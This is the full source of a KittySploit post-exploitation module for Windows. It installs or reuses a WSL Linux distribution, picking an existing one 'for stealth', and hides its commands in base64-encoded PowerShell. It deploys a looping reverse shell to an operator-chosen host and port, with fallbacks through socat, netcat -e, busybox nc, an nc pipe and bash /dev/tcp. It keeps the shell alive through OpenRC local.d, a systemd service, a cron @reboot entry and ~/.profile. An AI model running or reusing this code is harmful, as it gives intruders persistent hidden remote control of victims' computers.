#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from kittysploit import *
import base64
import textwrap
import time


class Module(Post):
    """Deploy and persist a reverse relay through Alpine on WSL"""

    __info__ = {
        "name": "Windows WSL Alpine Relay",
        "description": (
            "Reuses existing WSL distributions when possible, otherwise installs Alpine, "
            "then deploys a resilient reverse relay with persistence."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
    }

    lhost = OptString("", "Listener IP address for the reverse relay", True)
    lport = OptPort(4444, "Listener port for the reverse relay", True)
    distro_name = OptString("Alpine", "Target WSL distribution name", False)
    install_distro = OptBool(True, "Install the distribution if it is missing", False)
    setup_relay = OptBool(True, "Deploy the relay script inside the distribution", False)
    install_persist = OptBool(True, "Install persistence for automatic restarts", False)

    def _execute_cmd(self, command: str, description: str = None) -> tuple:
        """Execute a command on the target and normalize the output"""
        try:
            if description:
                print_status(description)
            output = self.cmd_execute(command)
        except Exception as exc:
            if description:
                print_warning(f"Failed: {exc}")
            return ("", False)

        if not output:
            return ("", True)

        output = output.replace("\x00", "").strip()
        if not output:
            return ("", True)

        if "Timeout waiting for response" in output:
            print_warning("Command timed out; check manually if it is still running.")
            return (output, False)

        if any(err in output for err in ["[WinError", "Connection closed"]):
            return (output, False)

        return (output, True)

    def _execute_wsl_cmd(
        self,
        command: str,
        description: str = None,
        distro: str = None,
        user: str = None,
    ) -> tuple:
        """
        Execute a shell command inside a WSL distribution.
        Uses base64 encoding to avoid all escaping issues with PowerShell and cmd.exe.
        """
        distro = distro or self.distro_name
        user_flag = ""
        if user:
            sanitized_user = "".join(c for c in user if c.isalnum() or c in ("-", "_", "."))
            if sanitized_user:
                user_flag = f" --user {sanitized_user}"
        
        # Encode the command in base64 to avoid all escaping issues
        command_b64 = base64.b64encode(command.encode('utf-8')).decode('ascii')
        
        # PowerShell script that decodes and executes the command
        # This avoids all the complex escaping issues
        ps_script = f"""
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{command_b64}'))
$output = wsl -d {distro}{user_flag} sh -c $cmd 2>$null
if ($output) {{ Write-Output $output }}
""".strip()
        
        # Encode the entire PowerShell script in base64
        ps_script_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
        
        # Execute using PowerShell's -EncodedCommand parameter
        # This completely avoids cmd.exe escaping issues
        output, success = self._execute_cmd(
            f'shell powershell -NoLogo -NoProfile -NonInteractive -EncodedCommand {ps_script_b64}',
            description,
        )
        
        # Filter out PowerShell error messages from output
        if output:
            lines = output.splitlines()
            filtered_lines = []
            for line in lines:
                # Skip PowerShell error patterns
                if any(pattern in line for pattern in [
                    "FullyQualifiedErrorId",
                    "CommandNotFoundException",
                    "CategoryInfo",
                    "Exception calling",
                    "At line:",
                    "PS C:",
                    "ParserError",
                ]):
                    continue
                filtered_lines.append(line)
            output = "\n".join(filtered_lines).strip()
        return (output, success)

    def _ensure_wsl_available(self) -> bool:
        """Verify that WSL is present on the host"""
        output, success = self._execute_cmd("shell wsl --status", "Checking WSL status...")
        if success:
            print_success("WSL is installed.")
            if output:
                print_info(output)
            return True

        output, success = self._execute_cmd("shell wsl --list --verbose", "Attempting to enumerate WSL distributions...")
        if success:
            print_success("WSL is installed.")
            if output:
                print_info(output)
            return True

        print_error("WSL does not appear to be installed on the target.")
        print_info("Install it manually with: wsl --install")
        return False

    def _list_wsl_distros(self) -> list:
        """Return the available WSL distributions"""
        output, success = self._execute_cmd("shell wsl --list --quiet", "Listing installed WSL distributions...")
        if not success:
            return []

        lines = [line.strip() for line in output.splitlines() if line.strip()]
        return lines

    def _get_home_directory(self) -> str:
        """Retrieve the default home directory path inside the target distro"""
        # Use echo instead of printf to avoid format string issues
        output, success = self._execute_wsl_cmd("echo $HOME", "Detecting distro home directory...")
        if success and output:
            # Get the last non-empty line that doesn't look like an error
            lines = [line.strip() for line in output.splitlines() if line.strip()]
            for line in reversed(lines):
                if line and not any(err in line for err in ["FullyQualifiedErrorId", "CommandNotFoundException", "CategoryInfo"]):
                    if line.startswith("/"):
                        return line
        print_warning("Failed to determine the distro home directory; defaulting to /root.")
        return "/root"

    def _detect_default_user(self) -> str:
        """Determine the default user inside the target WSL distribution"""
        output, success = self._execute_wsl_cmd("whoami", "Detecting default WSL user...")
        if success and output:
            # Get the last non-empty line that doesn't look like an error
            lines = [line.strip() for line in output.splitlines() if line.strip()]
            for line in reversed(lines):
                if line and not any(err in line for err in ["FullyQualifiedErrorId", "CommandNotFoundException", "CategoryInfo"]):
                    # Check if it looks like a valid username (alphanumeric with possible underscores/hyphens)
                    if all(c.isalnum() or c in ("_", "-") for c in line):
                        print_info(f"Default WSL user: {line}")
                        return line
        print_warning("Failed to determine the default WSL user; assuming root.")
        return "root"

    def _select_target_distro(self) -> None:
        """
        Prefer reusing an existing WSL distribution for stealth while ignoring
        Docker Desktop helper instances that are not usable Linux targets.
        """
        distros = self._list_wsl_distros()
        if not distros:
            print_info(f"No WSL distributions detected; will install '{self.distro_name}'.")
            return

        ignored = {"docker-desktop", "docker-desktop-data"}
        usable = [d for d in distros if d.lower() not in ignored]

        requested = next((d for d in usable if d.lower() == self.distro_name.lower()), None)
        if requested:
            self.distro_name = requested
            print_info(f"Using operator-selected distribution '{requested}'.")
            return

        if usable:
            chosen = usable[0]
            self.distro_name = chosen
            print_success(f"Existing distribution '{chosen}' found; using it for stealth deployment.")
            return

        print_warning(
            "Only Docker Desktop helper distributions were found; "
            f"will fall back to installing/using '{self.distro_name}'."
        )

    def _ensure_distro_present(self) -> bool:
        """Ensure the requested distribution exists"""
        distro = self.distro_name
        distros = self._list_wsl_distros()
        if any(d.lower() == distro.lower() for d in distros):
            print_success(f"WSL distribution '{distro}' is available.")
            return True

        if not self.install_distro:
            print_error(f"WSL distribution '{distro}' is not installed and auto-installation is disabled.")
            return False

        print_warning(f"WSL distribution '{distro}' is not installed. Attempting installation...")
        install_cmd = f"shell wsl --install -d {distro}"
        _, started = self._execute_cmd(install_cmd, f"Installing WSL distribution '{distro}' (this may take several minutes)...")
        if not started:
            print_warning("The installation command returned an error; continuing to poll in case it succeeded in the background.")

        max_wait = 360
        interval = 15
        elapsed = 0

        while elapsed < max_wait:
            time.sleep(interval)
            elapsed += interval
            distros = self._list_wsl_distros()
            if any(d.lower() == distro.lower() for d in distros):
                print_success(f"Distribution '{distro}' installed successfully.")
                return True
            print_status(f"Waiting for '{distro}' to finish installing... ({elapsed}s)")

        print_error(f"Failed to detect the '{distro}' distribution after waiting {max_wait} seconds.")
        print_info("Verify the installation manually with: wsl --list --verbose")
        return False

    def _command_exists(self, command: str) -> bool:
        """Check if a command exists within the WSL distro"""
        script = f"if command -v {command} >/dev/null 2>&1; then echo yes; fi"
        output, _ = self._execute_wsl_cmd(script, None)
        return bool(output.strip()) if output else False

    def _detect_package_manager(self) -> str:
        """Identify the available package manager inside the target distro"""
        script = textwrap.dedent(
            """
            if command -v apk >/dev/null 2>&1; then
                echo apk
            elif command -v apt-get >/dev/null 2>&1; then
                echo apt
            elif command -v dnf >/dev/null 2>&1; then
                echo dnf
            elif command -v yum >/dev/null 2>&1; then
                echo yum
            elif command -v pacman >/dev/null 2>&1; then
                echo pacman
            else
                echo unknown
            fi
            """
        ).strip()
        output, _ = self._execute_wsl_cmd(script, "Detecting package manager...")
        if output:
            # Filter out PowerShell errors and get the last valid line
            lines = [line.strip() for line in output.splitlines() if line.strip()]
            valid_managers = ["apk", "apt", "dnf", "yum", "pacman", "unknown"]
            for line in reversed(lines):
                # Skip if it looks like an error
                if any(err in line for err in ["FullyQualifiedErrorId", "CommandNotFoundException", "CategoryInfo"]):
                    continue
                # Check if it's a valid package manager name
                if line in valid_managers:
                    manager = line
                    print_info(f"Gestionnaire de paquets détecté: {manager}")
                    self.package_manager = manager
                    return manager
        manager = "unknown"
        print_info(f"Gestionnaire de paquets détecté: {manager}")
        self.package_manager = manager
        return manager

    def _prepare_environment(self) -> bool:
        """Refresh packages and install the tooling required by the relay"""
        distro = self.distro_name
        manager = self._detect_package_manager()

        commands = []
        if manager == "apk":
            commands = [
                ("apk update", "Refreshing Alpine package index..."),
                ("apk add --no-cache bash busybox-extras curl wget socat netcat-openbsd", "Installing required tools..."),
            ]
        elif manager == "apt":
            commands = [
                ("apt-get update -y", "Refreshing apt cache..."),
                ("DEBIAN_FRONTEND=noninteractive apt-get install -y bash curl wget socat netcat-openbsd", "Installing required tools via apt..."),
            ]
        elif manager in {"dnf", "yum"}:
            installer = manager
            commands = [
                (f"{installer} -y update", f"Refreshing {installer} metadata..."),
                (f"{installer} -y install bash curl wget socat nmap-ncat", f"Installing tools via {installer}..."),
            ]
        elif manager == "pacman":
            commands = [
                ("pacman -Sy --noconfirm", "Refreshing pacman cache..."),
                ("pacman -S --noconfirm bash curl wget socat gnu-netcat", "Installing tools via pacman..."),
            ]
        else:
            print_warning("Unable to detect a supported package manager automatically.")
            print_info("Attempting to continue with existing binaries.")

        commands.append(("mkdir -p /usr/local/bin /var/log", "Preparing filesystem layout..."))

        everything_ok = True
        for cmd, desc in commands:
            _, success = self._execute_wsl_cmd(cmd, desc, distro, user="root")
            everything_ok = everything_ok and success

        if everything_ok:
            print_success("Alpine environment prepared successfully.")
        else:
            print_warning("Some Alpine preparation steps failed; verify manually before continuing.")
        return True

    def _write_file(
        self,
        path: str,
        content: str,
        mode: str,
        description: str,
        use_root: bool = False,
    ) -> bool:
        """
        Write a file inside the distribution using a temporary file and optional sudo.
        """
        distro = self.distro_name
        normalized_content = content.replace("\r\n", "\n").replace("\r", "\n")
        user = "root" if use_root else None
        path_escaped = path.replace("'", "'\"'\"'")
        
        # Use base64 encoding to avoid all escaping issues with the content
        content_b64 = base64.b64encode(normalized_content.encode('utf-8')).decode('ascii')
        
        script = textwrap.dedent(
            f"""
            set -e
            target="{path_escaped}"
            target_dir=$(dirname "$target")
            
            # Create target directory if it doesn't exist
            if [ ! -d "$target_dir" ]; then
                if [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1; then
                    sudo mkdir -p "$target_dir" || exit 1
                else
                    mkdir -p "$target_dir" || exit 1
                fi
            fi
            
            # Create temporary file
            tmp=$(mktemp /tmp/ksrelay.XXXXXX) || exit 1
            trap "rm -f $tmp" EXIT
            
            # Decode and write content
            echo '{content_b64}' | base64 -d > "$tmp" || exit 1
            
            # Set permissions
            chmod {mode} "$tmp" || exit 1
            
            # Move to target location
            if [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1; then
                sudo mv "$tmp" "$target" || exit 1
            else
                mv "$tmp" "$target" || exit 1
            fi
            
            # Verify file exists
            if [ ! -f "$target" ]; then
                echo "ERROR: File not created" >&2
                exit 1
            fi
            
            echo "SUCCESS"
            """
        ).strip()

        output, success = self._execute_wsl_cmd(script, description, distro, user=user)
        
        if not success:
            # Try to get more information about the error
            debug_cmd = f"ls -la $(dirname '{path_escaped}') 2>&1 || echo 'DIR_ERROR'"
            debug_output, _ = self._execute_wsl_cmd(debug_cmd, None, distro, user=user)
            if debug_output:
                print_warning(f"Directory listing: {debug_output}")
            # Also check if base64 command is available
            base64_check = "command -v base64 >/dev/null 2>&1 && echo 'base64_available' || echo 'base64_missing'"
            base64_output, _ = self._execute_wsl_cmd(base64_check, None, distro, user=user)
            if "base64_missing" in (base64_output or ""):
                print_warning("base64 command not found in WSL distribution")
            return False
        
        # Check if the script reported success
        if "SUCCESS" in (output or ""):
            # Verify file exists
            verify_cmd = f"test -f '{path_escaped}' && echo '__KS_FILE_PRESENT__' || echo '__KS_FILE_MISSING__'"
            verify_output, _ = self._execute_wsl_cmd(verify_cmd, None, distro, user=user)
            if "__KS_FILE_PRESENT__" in (verify_output or ""):
                return True
            else:
                print_warning(f"File verification failed for {path}")
                return False
        
        return False

    def _deploy_relay(self) -> str:
        """Create the relay script with multiple connection fallbacks"""
        if not self.setup_relay:
            print_status("Relay deployment disabled via options.")
            return ""

        lhost = self.lhost
        lport = self.lport
        script_template = textwrap.dedent(
            """\
            #!/bin/sh
            LHOST="{lhost}"
            LPORT="{lport}"
            LOG_FILE="/var/log/ksrelay.log"

            timestamp() {{
                date '+%Y-%m-%d %H:%M:%S'
            }}

            log_msg() {{
                echo "$(timestamp) $1" >> "$LOG_FILE" 2>&1
            }}

            run_tcp() {{
                log_msg "Using bash /dev/tcp method"
                if command -v bash >/dev/null 2>&1; then
                    # Simple bash reverse shell using /dev/tcp
                    bash -c 'exec 5<>/dev/tcp/'"$LHOST"'/'"$LPORT"'; cat <&5 | while read line; do eval "$line" >&5 2>&5; done' 2>>"$LOG_FILE" || true
                else
                    log_msg "ERROR: bash not found, cannot use /dev/tcp method"
                    return 1
                fi
            }}

            log_msg "Relay script started, connecting to $LHOST:$LPORT"

            while true; do
                log_msg "Attempting connection to $LHOST:$LPORT"
                
                # Try socat first
                if command -v socat >/dev/null 2>&1; then
                    log_msg "Trying socat..."
                    if socat TCP:"$LHOST":"$LPORT" EXEC:/bin/sh,pty,stderr,setsid,sane 2>>"$LOG_FILE"; then
                        log_msg "socat connection successful"
                        continue
                    else
                        log_msg "socat connection failed"
                    fi
                fi
                
                # Try netcat with -e option
                if command -v nc >/dev/null 2>&1; then
                    log_msg "Trying nc..."
                    if nc "$LHOST" "$LPORT" -e /bin/sh 2>>"$LOG_FILE"; then
                        log_msg "nc connection successful"
                        continue
                    else
                        log_msg "nc connection failed"
                    fi
                fi
                
                # Try busybox nc
                if command -v busybox >/dev/null 2>&1 && busybox nc -h >/dev/null 2>&1; then
                    log_msg "Trying busybox nc..."
                    if busybox nc "$LHOST" "$LPORT" -e /bin/sh 2>>"$LOG_FILE"; then
                        log_msg "busybox nc connection successful"
                        continue
                    else
                        log_msg "busybox nc connection failed"
                    fi
                fi
                
                # Try netcat without -e (using pipe method)
                if command -v nc >/dev/null 2>&1; then
                    log_msg "Trying nc with pipe method..."
                    if nc "$LHOST" "$LPORT" < /dev/null 2>>"$LOG_FILE"; then
                        # If connection succeeds, try to get a shell
                        (nc "$LHOST" "$LPORT" 2>>"$LOG_FILE" | /bin/sh 2>>"$LOG_FILE" | nc "$LHOST" "$LPORT" 2>>"$LOG_FILE") &
                        sleep 2
                        continue
                    else
                        log_msg "nc pipe method failed"
                    fi
                fi
                
                # Fallback to bash /dev/tcp
                log_msg "Trying bash /dev/tcp fallback..."
                if run_tcp; then
                    log_msg "bash /dev/tcp connection successful"
                    continue
                else
                    log_msg "All connection methods failed, waiting 10 seconds before retry"
                    sleep 10
                fi
            done
            """
        )
        relay_script = script_template.format(lhost=lhost, lport=lport)

        home_dir = getattr(self, "home_dir", "") or self._get_home_directory()
        targets = [("/usr/local/bin/ksrelay.sh", True)]
        if home_dir:
            targets.append((f"{home_dir}/.local/bin/ksrelay.sh", False))
        for target, require_root in targets:
            if self._write_file(target, relay_script, "0755", f"Deploying relay script to {target}...", use_root=require_root):
                print_success(f"Relay script deployed to {target}")
                return target
            print_warning(f"Failed to deploy relay script to {target}.")

        print_error("Failed to write the relay script to any location.")
        return ""

    def _verify_script_exists(self, script_path: str) -> bool:
        """Verify that the relay script exists and is executable"""
        check_cmd = f"test -f {script_path} && test -x {script_path} && echo 'exists' || echo 'missing'"
        output, success = self._execute_wsl_cmd(check_cmd, None, user="root")
        if success and "exists" in output:
            return True
        print_warning(f"Relay script {script_path} not found or not executable")
        return False
    
    def _check_relay_running(self, script_path: str) -> bool:
        """Check if the relay process is running"""
        check_cmd = f"pgrep -f '{script_path}' >/dev/null 2>&1 && echo 'running' || echo 'not_running'"
        output, success = self._execute_wsl_cmd(check_cmd, None, user="root")
        if success and "running" in output:
            return True
        return False

    def _read_relay_log(self, lines: int = 10) -> str:
        """Read the last N lines from the relay log"""
        read_cmd = f"tail -n {lines} /var/log/ksrelay.log 2>/dev/null || echo 'No log file found'"
        output, _ = self._execute_wsl_cmd(read_cmd, None, user="root")
        return output if output else "No log output available"
    
    def _start_relay(self, script_path: str) -> None:
        """Launch the relay in the background"""
        if not script_path:
            return
        
        # Verify script exists
        if not self._verify_script_exists(script_path):
            print_error(f"Relay script {script_path} not found. Cannot start relay.")
            return
        
        # Kill any existing relay process
        kill_cmd = f"pkill -f '{script_path}' 2>/dev/null || true"
        self._execute_wsl_cmd(kill_cmd, None, user="root")

        # Start the relay
        start_cmd = f"nohup {script_path} >>/var/log/ksrelay.log 2>&1 &"
        self._execute_wsl_cmd(start_cmd, "Starting the relay in the background...", user="root")
        
        # Wait a moment for the process to start
        time.sleep(2)
        
        # Verify it's running
        if self._check_relay_running(script_path):
            print_success("Relay process is running")
        else:
            print_warning("Relay process may not be running. Check logs for errors.")
            log_output = self._read_relay_log(5)
            if log_output:
                print_info(f"Recent log output:\n{log_output}")

    def _wake_distribution(self) -> None:
        """Ensure the WSL instance is running so the reverse relay can connect"""
        distro = self.distro_name
        # Use _execute_wsl_cmd which properly handles PowerShell escaping
        self._execute_wsl_cmd("echo ksrelay awake", f"Starting '{distro}' instance to trigger the relay...", distro)

    def _append_profile_entry(self, line: str, profile_path: str) -> bool:
        """Ensure the provided line exists inside a profile file"""
        distro = self.distro_name
        line_b64 = base64.b64encode(line.encode()).decode().replace("'", "'\"'\"'")
        script = textwrap.dedent(
            f"""
            target="{profile_path}"
            mkdir -p "$(dirname "$target")" 2>/dev/null || true
            entry=$(printf '%s' '{line_b64}' | base64 -d)
            if grep -Fqx "$entry" "$target" 2>/dev/null; then
                exit 0
            fi
            printf '%s\\n' "$entry" >> "$target"
            """
        ).strip()
        profile_user = getattr(self, "distro_user", None)
        _, success = self._execute_wsl_cmd(
            script,
            f"Ensuring '{profile_path}' starts the relay...",
            distro,
            user=profile_user,
        )
        return success

    def _install_persistence(self, script_path: str) -> bool:
        """Install persistence using OpenRC's local.d and a profile fallback"""
        if not self.install_persist:
            print_status("Persistence installation skipped per user option.")
            return True

        if not script_path:
            print_error("Cannot install persistence without a relay script.")
            return False

        locald_ok = False
        if self._command_exists("rc-update"):
            locald_script = textwrap.dedent(
                f"""\
                #!/bin/sh
                nohup {script_path} >/var/log/ksrelay.log 2>&1 &
                """
            )
            self._execute_wsl_cmd("mkdir -p /etc/local.d", "Preparing /etc/local.d directory...", user="root")
            locald_ok = self._write_file(
                "/etc/local.d/ksrelay.start",
                locald_script,
                "0755",
                "Creating /etc/local.d/ksrelay.start...",
                use_root=True,
            )
            if locald_ok:
                self._execute_wsl_cmd(
                    "rc-update add local default 2>/dev/null || true",
                    "Ensuring OpenRC local service is enabled...",
                    user="root",
                )
                self._execute_wsl_cmd(
                    "rc-service local restart 2>/dev/null || true",
                    "Reloading OpenRC local service...",
                    user="root",
                )

        systemd_ok = False
        if self._command_exists("systemctl"):
            service_content = textwrap.dedent(
                f"""\
                [Unit]
                Description=KittySploit Relay Service
                After=network.target

                [Service]
                Type=simple
                ExecStart={script_path}
                Restart=always
                RestartSec=15

                [Install]
                WantedBy=multi-user.target
                """
            )
            service_ok = self._write_file(
                "/etc/systemd/system/ksrelay.service",
                service_content,
                "0644",
                "Creating systemd service file...",
                use_root=True,
            )
            if service_ok:
                reload_cmd = "if command -v sudo >/dev/null 2>&1; then sudo systemctl daemon-reload; else systemctl daemon-reload; fi"
                enable_cmd = "if command -v sudo >/dev/null 2>&1; then sudo systemctl enable ksrelay.service; else systemctl enable ksrelay.service; fi"
                restart_cmd = "if command -v sudo >/dev/null 2>&1; then sudo systemctl restart ksrelay.service; else systemctl restart ksrelay.service; fi"
                self._execute_wsl_cmd(reload_cmd, "Reloading systemd daemon...", user="root")
                self._execute_wsl_cmd(enable_cmd, "Enabling relay service...", user="root")
                self._execute_wsl_cmd(restart_cmd, "Starting relay service...", user="root")
                systemd_ok = True

        cron_ok = False
        if self._command_exists("crontab"):
            cron_entry = f"@reboot {script_path} >/var/log/ksrelay.log 2>&1"
            cron_script = textwrap.dedent(
                f"""\
                entry='{cron_entry}'
                tmp=$(mktemp /tmp/cron.XXXXXX) || exit 1
                crontab -l 2>/dev/null | grep -v '{script_path}' > "$tmp" || true
                if ! grep -Fqx "$entry" "$tmp"; then
                    printf '%s\\n' "$entry" >> "$tmp"
                fi
                crontab "$tmp"
                rm -f "$tmp"
                """
            ).strip()
            _, cron_ok = self._execute_wsl_cmd(cron_script, "Installing cron persistence...", user="root")

        profile_line = f"nohup {script_path} >/var/log/ksrelay.log 2>&1 &"
        profile_ok = self._append_profile_entry(profile_line, "$HOME/.profile")

        if locald_ok or profile_ok or systemd_ok or cron_ok:
            print_success("Persistence installed successfully.")
            if locald_ok:
                print_info("  - OpenRC local.d will start the relay when the distro boots.")
            if systemd_ok:
                print_info("  - systemd service keeps the relay alive automatically.")
            if cron_ok:
                print_info("  - Cron @reboot entry ensures the relay starts with user sessions.")
            if profile_ok:
                print_info("  - ~/.profile will relaunch the relay when the user logs in.")
            return True

        print_warning("Failed to install automatic persistence; start the relay manually if needed.")
        return False

    def run(self):
        """Entry point for the module"""
        print_success("Windows WSL Alpine Relay")
        print_info("=" * 70)

        if not self.lhost:
            print_error("Option LHOST is required.")
            return False

        self.package_manager = "unknown"

        if not self._ensure_wsl_available():
            return False

        self._select_target_distro()

        if not self._ensure_distro_present():
            return False

        self.distro_user = self._detect_default_user()
        self.home_dir = self._get_home_directory()

        self._prepare_environment()

        script_path = self._deploy_relay()
        if not script_path:
            if self.setup_relay:
                return False
            print_status("Relay deployment disabled; skipping start and persistence tasks.")
            return True

        self._start_relay(script_path)

        if not self._install_persistence(script_path):
            print_warning("Relay deployed but persistence was not installed.")

        self._wake_distribution()
        
        # Final verification
        print_info("")
        print_info("Verifying relay status...")
        if script_path:
            if self._check_relay_running(script_path):
                print_success("Relay process is running")
            else:
                print_warning("Relay process is not running. Checking logs...")
                log_output = self._read_relay_log(10)
                if log_output and "No log file found" not in log_output:
                    print_info("Recent relay log:")
                    print_info(log_output)
                else:
                    print_warning("No log file found. The relay may not have started.")
                    print_info("Try manually starting it with:")
                    print_info(f"  wsl -d {self.distro_name} -- {script_path}")

        print_info("")
        print_success("Relay deployment complete.")
        print_info(f"Distro      : {self.distro_name}")
        print_info(f"Relay target: {self.lhost}:{self.lport}")
        print_info(f"Script path : {script_path}")
        print_info("")
        print_warning(f"IMPORTANT: Start a listener on {self.lhost}:{self.lport} before the relay can connect.")
        print_info(f"Check relay status with: wsl -d {self.distro_name} -- tail -f /var/log/ksrelay.log")
        print_info("")

        return True
